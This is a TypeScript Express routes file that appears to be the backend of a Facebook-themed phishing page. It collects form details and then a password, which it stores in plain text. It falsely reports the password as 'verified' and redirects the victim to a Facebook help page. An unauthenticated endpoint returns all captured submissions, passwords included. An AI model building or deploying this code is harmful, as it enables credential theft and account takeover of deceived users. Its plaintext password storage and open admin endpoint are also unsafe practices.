import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { mainFormSchema, passwordFormSchema } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // Submit main form data
  app.post("/api/forms/main", async (req, res) => {
    try {
      const validatedData = mainFormSchema.parse(req.body);
      
      const submission = await storage.createFormSubmission({
        ...validatedData,
        step: "main",
        password: null,
      });

      res.json({ 
        success: true, 
        submissionId: submission.id,
        message: "Form submitted successfully" 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ 
          success: false, 
          errors: error.errors.map(e => ({ field: e.path.join('.'), message: e.message }))
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: "Internal server error" 
        });
      }
    }
  });

  // Submit password verification
  app.post("/api/forms/password", async (req, res) => {
    try {
      const validatedData = passwordFormSchema.parse(req.body);
      
      const submission = await storage.updateFormSubmission(validatedData.submissionId, {
        password: validatedData.password,
        step: "password",
      });

      if (!submission) {
        res.status(404).json({ 
          success: false, 
          message: "Submission not found" 
        });
        return;
      }

      res.json({ 
        success: true, 
        message: "Password verified successfully",
        redirectUrl: "https://www.facebook.com/help/media/thank-you?rdrhc"
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ 
          success: false, 
          errors: error.errors.map(e => ({ field: e.path.join('.'), message: e.message }))
        });
      } else {
        res.status(500).json({ 
          success: false, 
          message: "Internal server error" 
        });
      }
    }
  });

  // Get all form submissions (for admin purposes)
  app.get("/api/forms/submissions", async (req, res) => {
    try {
      const submissions = await storage.getAllFormSubmissions();
      res.json({ success: true, data: submissions });
    } catch (error) {
      res.status(500).json({ 
        success: false, 
        message: "Internal server error" 
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
